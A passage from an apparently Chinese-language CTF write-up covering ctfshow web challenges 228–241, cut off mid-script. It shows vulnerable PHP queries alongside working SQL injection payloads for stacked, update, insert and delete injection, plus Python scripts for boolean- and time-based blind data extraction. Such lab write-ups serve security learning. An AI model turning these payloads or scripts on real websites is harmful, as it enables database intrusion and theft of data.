class="punctuation">:</span><span class="string">&quot;utf8&quot;</span><span class="punctuation">,</span><span class="attr">&quot;COLLATION_CONNECTION&quot;</span><span class="punctuation">:</span><span class="string">&quot;utf8_general_ci&quot;</span><span class="punctuation">,</span><span class="attr">&quot;DATABASE_COLLATION&quot;</span><span class="punctuation">:</span><span class="string">&quot;utf8mb4_general_ci&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$bansql</span> = <span class="string">&quot;select char from banlist;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//师傅说内容太多，就写入数据库保存</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$banlist</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$banlist</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$char</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的堆叠注入，这次把禁用的字符放进了表里，测试发现 web226 的 payload 还能用，一把梭。    </p>
<h2 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//师傅说内容太多，就写入数据库保存</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$banlist</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$banlist</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$char</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的堆叠注入，同上题一把梭。    </p>
<h2 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//师傅说内容太多，就写入数据库保存</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$banlist</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$banlist</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$char</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的堆叠注入，同上上题一把梭。    </p>
<h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure>
<p>update 注入，可以布尔盲注，但更方便的是注入 password 处逗号分隔用要查的数据改掉 username ，注释掉后面的条件可覆盖所有的记录，再查询数据实现回显。<br>payload1: <code>password=ctfshow&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;username=nonono</code><br>username: <code>banlist,ctfshow_user,flaga</code><br>payload2: <code>password=ctfshow&#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flaga&#39;)%23&amp;username=nonono</code><br>username: <code>id,flagas,info</code><br>payload3: <code>password=ctfshow&#39;,username=(select flagas from flaga)%23&amp;username=nonono</code><br>username 找到 flag。    </p>
<h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = md5(&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;) where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure>
<p>update 注入，和上一题相比多给 password 套了一层 md5 函数，对后面的 username 无影响。<br>payload1: <code>password=ctfshow&#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;username=nonono</code><br>username: <code>banlist,ctfshow_user,flagaa</code><br>payload2: <code>password=ctfshow&#39;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flagaa&#39;)%23&amp;username=nonono</code><br>username: <code>id,flagass,info</code><br>payload3: <code>password=ctfshow&#39;),username=(select flagass from flagaa)%23&amp;username=nonono</code><br>username 找到 flag。    </p>
<h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure>
<p>update 注入，题目说没过滤，但之前的 payload 跑不通了，那就布尔盲注叭。。。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7b8e78f1-5553-4398-b9a7-084487b6d003.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 banlist,ctfshow_user,flag233333</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagass233,info</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;select flagass233 from flag233333&quot;</span></span><br><span class="line"></span><br><span class="line">condition = <span class="string">&quot;ascii(mid((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;更新成功&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="built_in">str</span>(random.random()),</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;ctfshow&#x27; and if(<span class="subst">&#123;p&#125;</span>,1,0) #&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>&quot;</span>, data=data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> true_flag <span class="keyword">in</span> response.json()[<span class="string">&quot;msg&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(condition.<span class="built_in">format</span>(payload, index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;!&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure>
<p>有过滤的 update 注入，相比上一题禁用了单引号，但还可以利用 <code>\</code> 转义 pass 的单引号，让 <code>&#39; where username = </code> 变成 pass，然后 $username 就可以注入了。<br>payload1: <code>password=%5C&amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23</code><br>username: <code>banlist,ctfshow_user,flag23a</code><br>payload2: <code>password=%5C&amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)%23</code><br>username: <code>id,flagass23s3,info</code><br>payload3: <code>password=%5C&amp;username=,username=(select flagass23s3 from flag23a)%23</code><br>username 找到 flag。    </p>
<h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//过滤 or &#x27; </span></span><br></pre></td></tr></table></figure>
<p>有过滤的 update 注入，相比上一题禁用了 <code>or</code>，information_schema 就也不能用了，改用 mysql.innodb_table_stats 查表名，再用<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">无列名注入</a>。<br>payload1: <code>password=%5C&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats)%23</code><br>username: <code>banlist,ctfshow_user,flag23a1,gtid_slave_pos</code><br>payload2: <code>password=%5C&amp;username=,username=(select d from (select 1,2 as d,3 union select * from flag23a1)a)%23</code><br>username 找到 flag。    </p>
<h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//过滤 or &#x27; flag</span></span><br></pre></td></tr></table></figure>
<p>有过滤的 update 注入，相比上一题禁用了 <code>flag</code>，但却还是能作为表名查询不知道为啥。<br>payload1: <code>password=%5C&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats)%23</code><br>username: <code>banlist,ctfshow_user,flaga,gtid_slave_pos</code><br>payload2: <code>password=%5C&amp;username=,username=(select hex(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)%23</code><br>username 解码为 flag。    </p>
<h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure>
<p>无过滤的 insert 注入，先用 <code>\</code> 在 username 逃逸后面的 password，查出来数据插入再查询得到回显。<br>payload1: <code>username=\&amp;password=,(select group_concat(table_name) from information_schema.tables where table_schema=database()))%23</code><br>password: <code>banlist,ctfshow_user,flag</code><br>payload2: <code>username=\&amp;password=,(select group_concat(column_name) from information_schema.columns where table_schema=database()))%23</code><br>password: <code>id,char,id,username,pass,id,flagass23s3,info</code><br>payload3: <code>username=\&amp;password=,(select flagass23s3 from flag))%23</code><br>password 找到 flag。    </p>
<h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//过滤空格</span></span><br></pre></td></tr></table></figure>
<p>有过滤的 insert 注入。相比上题过滤了空格，尝试 <code>%09 %0a %0b %0c %0d /**/</code> 都不行，括号可以。<br>payload1: <code>username=\&amp;password=,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))%23</code><br>password: <code>banlist,ctfshow_user,flagb</code><br>payload2: <code>username=\&amp;password=,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())))%23</code><br>password: <code>id,char,id,username,pass,id,flag,info</code><br>payload3: <code>username=\&amp;password=,(select(flag)from(flagb)))%23</code><br>password 找到 flag。    </p>
<h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤空格 or </span></span><br></pre></td></tr></table></figure>
<p>有过滤的 insert 注入、相比上题过滤了 <code>or</code>，<code>information_schema</code> 中枪，改用 <code>mysql.innodb_table_stats</code>。<br>payload1: <code>username=\&amp;password=,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))%23</code><br>password: <code>banlist,ctfshow_user,flagbb</code><br>脑洞列名 flag。<br>payload2: <code>username=\&amp;password=,(select(flag)from(flagbb)))%23</code><br>password 找到 flag。    </p>
<h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//过滤空格 or sys mysql</span></span><br></pre></td></tr></table></figure>
<p>有过滤的 insert 注入，表名靠爆破列名靠猜。<br>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39865a8d-b0b3-44cc-be00-3eff183f3c70.challenge.ctf.show:8080/api/insert.php&quot;</span></span><br><span class="line">payloads = [&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;,(select(flag)from(flag<span class="subst">&#123;a&#125;</span>)))#&quot;</span></span><br><span class="line">&#125; <span class="keyword">for</span> a <span class="keyword">in</span> [<span class="string">f&quot;<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span><span class="subst">&#123;c&#125;</span><span class="subst">&#123;d&#125;</span><span class="subst">&#123;e&#125;</span>&quot;</span><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> d <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">    response = requests.post(url, data=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] response: <span class="subst">&#123;response.json()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>password 找到 flag。    </p>
<h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除记录</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;delete from  ctfshow_user where id = <span class="subst">&#123;$id&#125;</span>&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure>
<p>无过滤的 delete 注入，没有分号数字型注入，布尔盲注记录会越来越少，用时间盲注。<br>一开始用 <code>if(1,sleep(1),0)</code> 尝试延时了好久都没返回，后来明白是所有记录都算了一遍 if，这里用 sleep(0.05) 就能延时超过 0.7s 了。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://58e7b03f-3c20-48e0-a8f8-9a3efa102f6d.challenge.ctf.show:8080/api/delete.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>() -&gt; <span class="built_in">float</span>:</span><br><span class="line">    rand = random.random()</span><br><span class="line">    time_s = time.time()</span><br><span class="line">    _ = requests.post(url,data=&#123;<span class="string">&quot;id&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;<span class="number">1</span> <span class="keyword">if</span> rand &gt; <span class="number">0.5</span> <span class="keyword">else</span> <span class="number">0</span>&#125;</span>,sleep(0.05),0)&quot;</span>&#125;)</span><br><span class="line">    time_e = time.time()</span><br><span class="line">    <span class="keyword">return</span> (rand &gt; <span class="number">0.5</span>, time_e - time_s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>([test() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)])</span><br><span class="line"><span class="comment"># [(True, 1.587900161743164),   </span></span><br><span class="line"><span class="comment">#  (True, 1.5109484195709229),  </span></span><br><span class="line"><span class="comment">#  (False, 0.49611639976501465),</span></span><br><span class="line"><span class="comment">#  (True, 1.4959654808044434),  </span></span><br><span class="line"><span class="comment">#  (True, 1.5170273780822754),  </span></span><br><span class="line"><span class="comment">#  (True, 1.4945576190948486),  </span></span><br><span class="line"><span class="comment">#  (False, 0.49541330337524414),</span></span><br><span class="line"><span class="comment">#  (False, 0.5102529525756836),</span></span><br><span class="line"><span class="comment">#  (False, 0.499330997467041),</span></span><br><span class="line"><span class="comment">#  (True, 1.5034611225128174),</span></span><br><span class="line"><span class="comment">#  (False, 0.5034303665161133),</span></span><br><span class="line"><span class="comment">#  (False, 0.48406004905700684),</span></span><br><span class="line"><span class="comment">#  (False, 0.5018246173858643),</span></span><br><span class="line"><span class="comment">#  (False, 0.510920524597168),</span></span><br><span class="line"><span class="comment">#  (False, 0.3732478618621826),</span></span><br><span class="line"><span class="comment">#  (False, 0.37639641761779785),</span></span><br><span class="line"><span class="comment">#  (False, 0.5028927326202393),</span></span><br><span class="line"><span class="comment">#  (True, 1.4956040382385254),</span></span><br><span class="line"><span class="comment">#  (True, 1.518369436264038),</span></span><br><span class="line"><span class="comment">#  (True, 1.4820938110351562),</span></span><br><span class="line"><span class="comment">#  (True, 1.5192668437957764),</span></span><br><span class="line"><span class="comment">#  (False, 0.4892847537994385),</span></span><br><span class="line"><span class="comment">#  (True, 1.5094366073608398),</span></span><br><span class="line"><span class="comment">#  (False, 0.4919764995574951),</span></span><br><span class="line"><span class="comment">#  (True, 1.5026938915252686),</span></span><br><span class="line"><span class="comment">#  (False, 0.5101568698883057),</span></span><br><span class="line"><span class="comment">#  (True, 1.5108904838562012),</span></span><br><span class="line"><span class="comment">#  (True, 1.4919395446777344),</span></span><br><span class="line"><span class="comment">#  (True, 1.4966061115264893),</span></span><br><span class="line"><span class="comment">#  (False, 0.5028080940246582)]</span></span><br><span class="line"><span class="comment"># 可知判断临界条件取 0.7s 就够了</span></span><br></pre></td></tr></table></figure>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://58e7b03f-3c20-48e0-a8f8-9a3efa102f6d.challenge.ctf.show:8080/api/delete.php&quot;</span></span><br><span class="line"><span class="comment"># 表名 banlist,ctfshow_user,flag</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flag,info</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;select flag from flag&quot;</span></span><br><span class="line">condition = <span class="string">&quot;ascii(mid((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span 